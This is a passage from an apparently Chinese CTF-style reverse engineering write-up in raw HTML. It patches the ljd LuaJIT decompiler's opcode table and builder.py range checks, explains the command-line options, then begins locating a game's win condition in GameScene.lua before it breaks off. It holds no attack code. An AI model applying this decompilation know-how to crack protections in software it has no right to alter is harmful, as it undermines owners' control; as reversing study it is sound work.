class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line">ISLT = _IDef(<span class="string">&quot;ISLT&quot;</span>, T_VAR, <span class="literal">None</span>, T_VAR, <span class="string">&quot;if &#123;A&#125; &lt; &#123;D&#125;&quot;</span>)</span><br><span class="line">ISGE = _IDef(<span class="string">&quot;ISGE&quot;</span>, T_VAR, <span class="literal">None</span>, T_VAR, <span class="string">&quot;if &#123;A&#125; &gt;= &#123;D&#125;&quot;</span>)</span><br><span class="line">ISLE = _IDef(<span class="string">&quot;ISLE&quot;</span>, T_VAR, <span class="literal">None</span>, T_VAR, <span class="string">&quot;if &#123;A&#125; &lt;= &#123;D&#125;&quot;</span>)</span><br><span class="line">ISGT = _IDef(<span class="string">&quot;ISGT&quot;</span>, T_VAR, <span class="literal">None</span>, T_VAR, <span class="string">&quot;if &#123;A&#125; &gt; &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISEQV = _IDef(<span class="string">&quot;ISEQV&quot;</span>, T_VAR, <span class="literal">None</span>, T_VAR, <span class="string">&quot;if &#123;A&#125; == &#123;D&#125;&quot;</span>)</span><br><span class="line">ISNEV = _IDef(<span class="string">&quot;ISNEV&quot;</span>, T_VAR, <span class="literal">None</span>, T_VAR, <span class="string">&quot;if &#123;A&#125; ~= &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISEQS = _IDef(<span class="string">&quot;ISEQS&quot;</span>, T_VAR, <span class="literal">None</span>, T_STR, <span class="string">&quot;if &#123;A&#125; == &#123;D&#125;&quot;</span>)</span><br><span class="line">ISNES = _IDef(<span class="string">&quot;ISNES&quot;</span>, T_VAR, <span class="literal">None</span>, T_STR, <span class="string">&quot;if &#123;A&#125; ~= &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISEQN = _IDef(<span class="string">&quot;ISEQN&quot;</span>, T_VAR, <span class="literal">None</span>, T_NUM, <span class="string">&quot;if &#123;A&#125; == &#123;D&#125;&quot;</span>)</span><br><span class="line">ISNEN = _IDef(<span class="string">&quot;ISNEN&quot;</span>, T_VAR, <span class="literal">None</span>, T_NUM, <span class="string">&quot;if &#123;A&#125; ~= &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISEQP = _IDef(<span class="string">&quot;ISEQP&quot;</span>, T_VAR, <span class="literal">None</span>, T_PRI, <span class="string">&quot;if &#123;A&#125; == &#123;D&#125;&quot;</span>)</span><br><span class="line">ISNEP = _IDef(<span class="string">&quot;ISNEP&quot;</span>, T_VAR, <span class="literal">None</span>, T_PRI, <span class="string">&quot;if &#123;A&#125; ~= &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Constant ops.</span></span><br><span class="line"></span><br><span class="line">KSTR = _IDef(<span class="string">&quot;KSTR&quot;</span>, T_DST, <span class="literal">None</span>, T_STR, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">KCDATA = _IDef(<span class="string">&quot;KCDATA&quot;</span>, T_DST, <span class="literal">None</span>, T_CDT, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">KSHORT = _IDef(<span class="string">&quot;KSHORT&quot;</span>, T_DST, <span class="literal">None</span>, T_SLIT, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">KNUM = _IDef(<span class="string">&quot;KNUM&quot;</span>, T_DST, <span class="literal">None</span>, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">KPRI = _IDef(<span class="string">&quot;KPRI&quot;</span>, T_DST, <span class="literal">None</span>, T_PRI, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">KNIL = _IDef(<span class="string">&quot;KNIL&quot;</span>, T_BS, <span class="literal">None</span>, T_BS, <span class="string">&quot;&#123;from_A_to_D&#125; = nil&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unary test and copy ops</span></span><br><span class="line"></span><br><span class="line">ISTC = _IDef(<span class="string">&quot;ISTC&quot;</span>, T_DST, <span class="literal">None</span>, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;; if &#123;D&#125;&quot;</span>)</span><br><span class="line">ISFC = _IDef(<span class="string">&quot;ISFC&quot;</span>, T_DST, <span class="literal">None</span>, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;; if not &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">IST = _IDef(<span class="string">&quot;IST&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>, T_VAR, <span class="string">&quot;if &#123;D&#125;&quot;</span>)</span><br><span class="line">ISF = _IDef(<span class="string">&quot;ISF&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>, T_VAR, <span class="string">&quot;if not &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISTYPE = _IDef(<span class="string">&quot;ISTYPE&quot;</span>, T_VAR, <span class="literal">None</span>, T_LIT, <span class="string">&quot;ISTYPE unknow&quot;</span>)</span><br><span class="line">ISNUM = _IDef(<span class="string">&quot;ISNUM&quot;</span>, T_VAR, <span class="literal">None</span>, T_LIT, <span class="string">&quot;ISNUM unknow&quot;</span>)</span><br><span class="line"><span class="comment"># Unary ops</span></span><br><span class="line"></span><br><span class="line">MOV = _IDef(<span class="string">&quot;MOV&quot;</span>, T_DST, <span class="literal">None</span>, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">NOT = _IDef(<span class="string">&quot;NOT&quot;</span>, T_DST, <span class="literal">None</span>, T_VAR, <span class="string">&quot;&#123;A&#125; = not &#123;D&#125;&quot;</span>)</span><br><span class="line">UNM = _IDef(<span class="string">&quot;UNM&quot;</span>, T_DST, <span class="literal">None</span>, T_VAR, <span class="string">&quot;&#123;A&#125; = -&#123;D&#125;&quot;</span>)</span><br><span class="line">LEN = _IDef(<span class="string">&quot;LEN&quot;</span>, T_DST, <span class="literal">None</span>, T_VAR, <span class="string">&quot;&#123;A&#125; = #&#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Returns.</span></span><br><span class="line"></span><br><span class="line">RETM = _IDef(<span class="string">&quot;RETM&quot;</span>, T_BS, <span class="literal">None</span>, T_LIT,</span><br><span class="line"><span class="string">&quot;return &#123;from_A_x_D_minus_one&#125;, ...MULTRES&quot;</span>)</span><br><span class="line"></span><br><span class="line">RET = _IDef(<span class="string">&quot;RET&quot;</span>,  T_RBS, <span class="literal">None</span>, T_LIT,</span><br><span class="line"><span class="string">&quot;return &#123;from_A_x_D_minus_two&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">RET0 = _IDef(<span class="string">&quot;RET0&quot;</span>, T_RBS, <span class="literal">None</span>, T_LIT, <span class="string">&quot;return&quot;</span>)</span><br><span class="line">RET1 = _IDef(<span class="string">&quot;RET1&quot;</span>, T_RBS, <span class="literal">None</span>, T_LIT, <span class="string">&quot;return &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Binary ops</span></span><br><span class="line"></span><br><span class="line">ADDVN = _IDef(<span class="string">&quot;ADDVN&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; + &#123;C&#125;&quot;</span>)</span><br><span class="line">SUBVN = _IDef(<span class="string">&quot;SUBVN&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; - &#123;C&#125;&quot;</span>)</span><br><span class="line">MULVN = _IDef(<span class="string">&quot;MULVN&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; * &#123;C&#125;&quot;</span>)</span><br><span class="line">DIVVN = _IDef(<span class="string">&quot;DIVVN&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; / &#123;C&#125;&quot;</span>)</span><br><span class="line">MODVN = _IDef(<span class="string">&quot;MODVN&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; % &#123;C&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ADDNV = _IDef(<span class="string">&quot;ADDNV&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;C&#125; + &#123;B&#125;&quot;</span>)</span><br><span class="line">SUBNV = _IDef(<span class="string">&quot;SUBNV&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;C&#125; - &#123;B&#125;&quot;</span>)</span><br><span class="line">MULNV = _IDef(<span class="string">&quot;MULNV&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;C&#125; * &#123;B&#125;&quot;</span>)</span><br><span class="line">DIVNV = _IDef(<span class="string">&quot;DIVNV&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;C&#125; / &#123;B&#125;&quot;</span>)</span><br><span class="line">MODNV = _IDef(<span class="string">&quot;MODNV&quot;</span>, T_DST, T_VAR, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;C&#125; % &#123;B&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ADDVV = _IDef(<span class="string">&quot;ADDVV&quot;</span>, T_DST, T_VAR, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; + &#123;C&#125;&quot;</span>)</span><br><span class="line">SUBVV = _IDef(<span class="string">&quot;SUBVV&quot;</span>, T_DST, T_VAR, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; - &#123;C&#125;&quot;</span>)</span><br><span class="line">MULVV = _IDef(<span class="string">&quot;MULVV&quot;</span>, T_DST, T_VAR, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; * &#123;C&#125;&quot;</span>)</span><br><span class="line">DIVVV = _IDef(<span class="string">&quot;DIVVV&quot;</span>, T_DST, T_VAR, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; / &#123;C&#125;&quot;</span>)</span><br><span class="line">MODVV = _IDef(<span class="string">&quot;MODVV&quot;</span>, T_DST, T_VAR, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; % &#123;C&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">POW = _IDef(<span class="string">&quot;POW&quot;</span>, T_DST, T_VAR, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;B&#125; ^ &#123;C&#125; (pow)&quot;</span>)</span><br><span class="line">CAT = _IDef(<span class="string">&quot;CAT&quot;</span>, T_DST, T_RBS, T_RBS,</span><br><span class="line"><span class="string">&quot;&#123;A&#125; = &#123;concat_from_B_to_C&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upvalue and function ops.</span></span><br><span class="line"></span><br><span class="line">UGET = _IDef(<span class="string">&quot;UGET&quot;</span>, T_DST, <span class="literal">None</span>, T_UV, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">USETV = _IDef(<span class="string">&quot;USETV&quot;</span>, T_UV, <span class="literal">None</span>, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">USETS = _IDef(<span class="string">&quot;USETS&quot;</span>, T_UV, <span class="literal">None</span>, T_STR, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">USETN = _IDef(<span class="string">&quot;USETN&quot;</span>, T_UV, <span class="literal">None</span>, T_NUM, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line">USETP = _IDef(<span class="string">&quot;USETP&quot;</span>, T_UV, <span class="literal">None</span>, T_PRI, <span class="string">&quot;&#123;A&#125; = &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">UCLO = _IDef(<span class="string">&quot;UCLO&quot;</span>, T_RBS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;nil uvs &gt;= &#123;A&#125;; goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">FNEW = _IDef(<span class="string">&quot;FNEW&quot;</span>, T_DST, <span class="literal">None</span>, T_FUN, <span class="string">&quot;&#123;A&#125; = function &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Table ops.</span></span><br><span class="line"></span><br><span class="line">TNEW = _IDef(<span class="string">&quot;TNEW&quot;</span>, T_DST, <span class="literal">None</span>, T_LIT, <span class="string">&quot;&#123;A&#125; = new table(&quot;</span></span><br><span class="line"><span class="string">&quot; array: &#123;D_array&#125;,&quot;</span></span><br><span class="line"><span class="string">&quot; dict: &#123;D_dict&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">TDUP = _IDef(<span class="string">&quot;TDUP&quot;</span>, T_DST, <span class="literal">None</span>, T_TAB, <span class="string">&quot;&#123;A&#125; = copy &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">GGET = _IDef(<span class="string">&quot;GGET&quot;</span>, T_DST, <span class="literal">None</span>, T_STR, <span class="string">&quot;&#123;A&#125; = _env[&#123;D&#125;]&quot;</span>)</span><br><span class="line">GSET = _IDef(<span class="string">&quot;GSET&quot;</span>, T_VAR, <span class="literal">None</span>, T_STR, <span class="string">&quot;_env[&#123;D&#125;] = &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">TGETV = _IDef(<span class="string">&quot;TGETV&quot;</span>, T_DST, T_VAR, T_VAR, <span class="string">&quot;&#123;A&#125; = &#123;B&#125;[&#123;C&#125;]&quot;</span>)</span><br><span class="line">TGETS = _IDef(<span class="string">&quot;TGETS&quot;</span>, T_DST, T_VAR, T_STR, <span class="string">&quot;&#123;A&#125; = &#123;B&#125;.&#123;C&#125;&quot;</span>)</span><br><span class="line">TGETB = _IDef(<span class="string">&quot;TGETB&quot;</span>, T_DST, T_VAR, T_LIT, <span class="string">&quot;&#123;A&#125; = &#123;B&#125;[&#123;C&#125;]&quot;</span>)</span><br><span class="line">TGETR = _IDef(<span class="string">&quot;TGETR&quot;</span>, T_DST, T_VAR, T_VAR, <span class="string">&quot;unkown TGETR&quot;</span>)</span><br><span class="line"></span><br><span class="line">TSETV = _IDef(<span class="string">&quot;TSETV&quot;</span>, T_VAR, T_VAR, T_VAR, <span class="string">&quot;&#123;B&#125;[&#123;C&#125;] = &#123;A&#125;&quot;</span>)</span><br><span class="line">TSETS = _IDef(<span class="string">&quot;TSETS&quot;</span>, T_VAR, T_VAR, T_STR, <span class="string">&quot;&#123;B&#125;.&#123;C&#125; = &#123;A&#125;&quot;</span>)</span><br><span class="line">TSETB = _IDef(<span class="string">&quot;TSETB&quot;</span>, T_VAR, T_VAR, T_LIT, <span class="string">&quot;&#123;B&#125;[&#123;C&#125;] = &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">TSETM = _IDef(<span class="string">&quot;TSETM&quot;</span>,  T_BS, <span class="literal">None</span>, T_NUM,</span><br><span class="line"><span class="string">&quot;for i = 0, MULTRES, 1 do&quot;</span></span><br><span class="line"><span class="string">&quot; &#123;A_minus_one&#125;[&#123;D_low&#125; + i] = slot(&#123;A&#125; + i)&quot;</span>)</span><br><span class="line"></span><br><span class="line">TSETR = _IDef(<span class="string">&quot;TSETR&quot;</span>, T_VAR, T_VAR, T_VAR, <span class="string">&quot;unkow TSETR&quot;</span>)</span><br><span class="line"><span class="comment"># Calls and vararg handling. T = tail call.</span></span><br><span class="line"></span><br><span class="line">CALLM = _IDef(<span class="string">&quot;CALLM&quot;</span>, T_BS, T_LIT, T_LIT,</span><br><span class="line"><span class="string">&quot;&#123;from_A_x_B_minus_two&#125; = &#123;A&#125;(&#123;from_A_plus_one_x_C&#125;, ...MULTRES)&quot;</span>)</span><br><span class="line"></span><br><span class="line">CALL = _IDef(<span class="string">&quot;CALL&quot;</span>, T_BS, T_LIT, T_LIT,</span><br><span class="line"><span class="string">&quot;&#123;from_A_x_B_minus_two&#125; = &#123;A&#125;(&#123;from_A_plus_one_x_C_minus_one&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">CALLMT = _IDef(<span class="string">&quot;CALLMT&quot;</span>, T_BS, <span class="literal">None</span>, T_LIT,</span><br><span class="line"><span class="string">&quot;return &#123;A&#125;(&#123;from_A_plus_one_x_D&#125;, ...MULTRES)&quot;</span>)</span><br><span class="line"></span><br><span class="line">CALLT = _IDef(<span class="string">&quot;CALLT&quot;</span>, T_BS, <span class="literal">None</span>, T_LIT,</span><br><span class="line"><span class="string">&quot;return &#123;A&#125;(&#123;from_A_plus_one_x_D_minus_one&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">ITERC = _IDef(<span class="string">&quot;ITERC&quot;</span>, T_BS, T_LIT, T_LIT,</span><br><span class="line"><span class="string">&quot;&#123;A&#125;, &#123;A_plus_one&#125;, &#123;A_plus_two&#125; =&quot;</span></span><br><span class="line"><span class="string">&quot; &#123;A_minus_three&#125;, &#123;A_minus_two&#125;, &#123;A_minus_one&#125;;&quot;</span></span><br><span class="line"><span class="string">&quot; &#123;from_A_x_B_minus_two&#125; =&quot;</span></span><br><span class="line"><span class="string">&quot; &#123;A_minus_three&#125;(&#123;A_minus_two&#125;, &#123;A_minus_one&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">ITERN = _IDef(<span class="string">&quot;ITERN&quot;</span>, T_BS, T_LIT, T_LIT,</span><br><span class="line"><span class="string">&quot;&#123;A&#125;, &#123;A_plus_one&#125;, &#123;A_plus_two&#125; =&quot;</span></span><br><span class="line"><span class="string">&quot; &#123;A_minus_three&#125;, &#123;A_minus_two&#125;, &#123;A_minus_one&#125;;&quot;</span></span><br><span class="line"><span class="string">&quot; &#123;from_A_x_B_minus_two&#125; =&quot;</span></span><br><span class="line"><span class="string">&quot; &#123;A_minus_three&#125;(&#123;A_minus_two&#125;, &#123;A_minus_one&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">VARG = _IDef(<span class="string">&quot;VARG&quot;</span>, T_BS, T_LIT, T_LIT,</span><br><span class="line"><span class="string">&quot;&#123;from_A_x_B_minus_two&#125; = ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISNEXT = _IDef(<span class="string">&quot;ISNEXT&quot;</span>,  T_BS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;Verify ITERN at &#123;D&#125;; goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loops and branches. I/J = interp/JIT, I/C/L = init/call/loop.</span></span><br><span class="line"></span><br><span class="line">FORI = _IDef(<span class="string">&quot;FORI&quot;</span>, T_BS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;for &#123;A_plus_three&#125; = &#123;A&#125;,&#123;A_plus_one&#125;,&#123;A_plus_two&#125;&quot;</span></span><br><span class="line"><span class="string">&quot; else goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">JFORI = _IDef(<span class="string">&quot;JFORI&quot;</span>, T_BS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;for &#123;A_plus_three&#125; = &#123;A&#125;,&#123;A_plus_one&#125;,&#123;A_plus_two&#125;&quot;</span></span><br><span class="line"><span class="string">&quot; else goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">FORL = _IDef(<span class="string">&quot;FORL&quot;</span>, T_BS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;&#123;A&#125; = &#123;A&#125; + &#123;A_plus_two&#125;;&quot;</span></span><br><span class="line"><span class="string">&quot; if cmp(&#123;A&#125;, sign &#123;A_plus_two&#125;,  &#123;A_plus_one&#125;) goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">IFORL = _IDef(<span class="string">&quot;IFORL&quot;</span>,  T_BS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;&#123;A&#125; = &#123;A&#125; + &#123;A_plus_two&#125;;&quot;</span></span><br><span class="line"><span class="string">&quot; if cmp(&#123;A&#125;, sign &#123;A_plus_two&#125;, &#123;A_plus_one&#125;) goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">JFORL = _IDef(<span class="string">&quot;JFORL&quot;</span>, T_BS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;&#123;A&#125; = &#123;A&#125; + &#123;A_plus_two&#125;;&quot;</span></span><br><span class="line"><span class="string">&quot; if cmp(&#123;A&#125;, sign &#123;A_plus_two&#125;, &#123;A_plus_one&#125;) goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ITERL = _IDef(<span class="string">&quot;ITERL&quot;</span>, T_BS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;&#123;A_minus_one&#125; = &#123;A&#125;; if &#123;A&#125; != nil goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">IITERL = _IDef(<span class="string">&quot;IITERL&quot;</span>, T_BS, <span class="literal">None</span>, T_JMP,</span><br><span class="line"><span class="string">&quot;&#123;A_minus_one&#125; = &#123;A&#125;; if &#123;A&#125; != nil goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">JITERL = _IDef(<span class="string">&quot;JITERL&quot;</span>, T_BS, <span class="literal">None</span>, T_LIT,</span><br><span class="line"><span class="string">&quot;&#123;A_minus_one&#125; = &#123;A&#125;; if &#123;A&#125; != nil goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">LOOP = _IDef(<span class="string">&quot;LOOP&quot;</span>, T_RBS, <span class="literal">None</span>, T_JMP, <span class="string">&quot;Noop&quot;</span>)</span><br><span class="line">ILOOP = _IDef(<span class="string">&quot;ILOOP&quot;</span>, T_RBS, <span class="literal">None</span>, T_JMP, <span class="string">&quot;Noop&quot;</span>)</span><br><span class="line">JLOOP = _IDef(<span class="string">&quot;JLOOP&quot;</span>, T_RBS, <span class="literal">None</span>, T_LIT, <span class="string">&quot;Noop&quot;</span>)</span><br><span class="line"></span><br><span class="line">JMP = _IDef(<span class="string">&quot;JMP&quot;</span>, T_RBS, <span class="literal">None</span>, T_JMP, <span class="string">&quot;goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function headers. I/J = interp/JIT, F/V/C = fixarg/vararg/C func.</span></span><br><span class="line"><span class="comment"># Shouldn&#x27;t be ever seen - they are not stored in raw dump?</span></span><br><span class="line"></span><br><span class="line">FUNCF = _IDef(<span class="string">&quot;FUNCF&quot;</span>, T_RBS, <span class="literal">None</span>, <span class="literal">None</span>,</span><br><span class="line"><span class="string">&quot;Fixed-arg function with frame size &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">IFUNCF = _IDef(<span class="string">&quot;IFUNCF&quot;</span>, T_RBS, <span class="literal">None</span>, <span class="literal">None</span>,</span><br><span class="line"><span class="string">&quot;Interpreted fixed-arg function with frame size &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">JFUNCF = _IDef(<span class="string">&quot;JFUNCF&quot;</span>, T_RBS, <span class="literal">None</span>, T_LIT,</span><br><span class="line"><span class="string">&quot;JIT compiled fixed-arg function with frame size &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">FUNCV = _IDef(<span class="string">&quot;FUNCV&quot;</span>, T_RBS, <span class="literal">None</span>, <span class="literal">None</span>,</span><br><span class="line"><span class="string">&quot;Var-arg function with frame size &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">IFUNCV = _IDef(<span class="string">&quot;IFUNCV&quot;</span>, T_RBS, <span class="literal">None</span>, <span class="literal">None</span>,</span><br><span class="line"><span class="string">&quot;Interpreted var-arg function with frame size &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">JFUNCV = _IDef(<span class="string">&quot;JFUNCV&quot;</span>, T_RBS, <span class="literal">None</span>, T_LIT,</span><br><span class="line"><span class="string">&quot;JIT compiled var-arg function with frame size &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">FUNCC = _IDef(<span class="string">&quot;FUNCC&quot;</span>, T_RBS, <span class="literal">None</span>, <span class="literal">None</span>,</span><br><span class="line"><span class="string">&quot;C function with frame size &#123;A&#125;&quot;</span>)</span><br><span class="line">FUNCCW = _IDef(<span class="string">&quot;FUNCCW&quot;</span>, T_RBS, <span class="literal">None</span>, <span class="literal">None</span>,</span><br><span class="line"><span class="string">&quot;Wrapped C function with frame size &#123;A&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">UNKNW = _IDef(<span class="string">&quot;UNKNW&quot;</span>, T_LIT, T_LIT, T_LIT, <span class="string">&quot;Unknown instruction&quot;</span>)</span><br></pre></td></tr></table></figure><p>第三处修改在 <code>ljd/ast/builder.py</code>，按照如下方式修改，使得每种指令都落在正确的解析区域中：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">diff -urNa ljd-old/ast/builder.py ljd-new/ast/builder.py</span><br><span class="line"><span class="comment">--- ljd-old/ast/builder.py2020-05-09 03:43:27.000000000 -0700</span></span><br><span class="line"><span class="comment">+++ ljd-new/ast/builder.py2022-09-20 02:04:53.955771000 -0700</span></span><br><span class="line"><span class="meta">@@ -276,7 +276,7 @@</span></span><br><span class="line">     last = instructions[-1]</span><br><span class="line">     opcode = 256 if len(instructions) == 1 else instructions[-2].opcode</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    if opcode &lt;= ins.ISF.opcode:</span></span><br><span class="line"><span class="addition">+    if opcode in (ins.ISLT.opcode, ins.ISGE.opcode, ins.ISLE.opcode, ins.ISGT.opcode, ins.ISEQV.opcode, ins.ISNEV.opcode, ins.ISEQS.opcode, ins.ISNES.opcode, ins.ISEQN.opcode, ins.ISNEN.opcode, ins.ISEQP.opcode, ins.ISNEP.opcode, ins.ISTC.opcode, ins.ISFC.opcode, ins.IST.opcode, ins.ISF.opcode):</span></span><br><span class="line">         assert last.opcode != ins.ISNEXT.opcode</span><br><span class="line">         return _build_conditional_warp(state, last_addr, instructions)</span><br><span class="line">     else:</span><br><span class="line"><span class="meta">@@ -507,7 +507,7 @@</span></span><br><span class="line">         expression = _build_unary_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     # Binary assignment operators (A = B op C)</span><br><span class="line"><span class="deletion">-    elif opcode &lt;= ins.POW.opcode:</span></span><br><span class="line"><span class="addition">+    elif ins.ADDVN.opcode &lt;= opcode &lt;= ins.POW.opcode:</span></span><br><span class="line">         expression = _build_binary_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     # Concat assignment type (A = B .. B + 1 .. ... .. C - 1 .. C)</span><br><span class="line"><span class="meta">@@ -515,7 +515,7 @@</span></span><br><span class="line">         expression = _build_concat_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     # Constant assignment operators except KNIL, which is weird anyway</span><br><span class="line"><span class="deletion">-    elif opcode &lt;= ins.KPRI.opcode:</span></span><br><span class="line"><span class="addition">+    elif ins.KSTR.opcode &lt;= opcode &lt;= ins.KPRI.opcode:</span></span><br><span class="line">         expression = _build_const_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     elif opcode == ins.UGET.opcode:</span><br><span class="line"><span class="meta">@@ -524,7 +524,7 @@</span></span><br><span class="line">     elif opcode == ins.USETV.opcode:</span><br><span class="line">         expression = _build_slot(state, addr, instruction.CD)</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    elif opcode &lt;= ins.USETP.opcode:</span></span><br><span class="line"><span class="addition">+    elif ins.USETS.opcode &lt;= opcode &lt;= ins.USETP.opcode:</span></span><br><span class="line">         expression = _build_const_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     elif opcode == ins.FNEW.opcode:</span><br></pre></td></tr></table></figure><p>在项目根目录运行 <code>python main.py -f &lt;script_name&gt;.luac64 &gt; &lt;script_name&gt;.lua</code> 可以得到单个文件的反编译结果，也可以通过 <code>-r </code> 选项指定目录批量反编译。另外，<code>-d</code> 选项用于指定输出目录，<code>-e</code> 选项用于指定文件后缀。</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>首先通过逆向思维来找到核心验证代码，在 <code>GameScene.lua</code> 的 <em>collisionH</em> 函数中可以找到游戏胜利的判断语句：</p><p><img src="/img/article/20230402/winning_condition.png" alt="winning_condition"></p><p>即当碰撞到板栗仔时，主角的身体类型应该是 